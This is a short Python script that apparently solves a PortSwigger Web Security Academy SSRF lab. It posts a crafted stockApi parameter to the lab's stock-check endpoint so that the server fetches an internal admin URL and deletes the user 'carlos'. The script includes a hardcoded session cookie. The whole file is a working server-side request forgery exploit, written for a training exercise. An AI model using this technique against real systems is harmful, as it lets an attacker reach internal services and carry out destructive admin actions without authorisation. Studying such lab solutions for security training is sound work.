import requests
from urllib.parse import quote_plus

lab_url = 'https://0a2700f1047ad2c883b72e2f00e600a0.web-security-academy.net/product/stock'

headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': 'https://0a2700f1047ad2c883b72e2f00e600a0.web-security-academy.net/product?productId=3'}
cookie = {'session': 'OIHwNcUYemTKmwSMc4FWM2CE6M5vCOJf'}

first = "".join(f"%{b:02X}" for b in 'a'.encode("ascii"))
payload = {
    'stockApi': quote_plus(f'/product/stock/check?productId=3&storeId=1&url=http://192.168.0.12:8080/admin/delete?user_id=carlos')
}


response = requests.post(url=lab_url, data=payload, cookies=cookie, headers=headers)

print(response.text)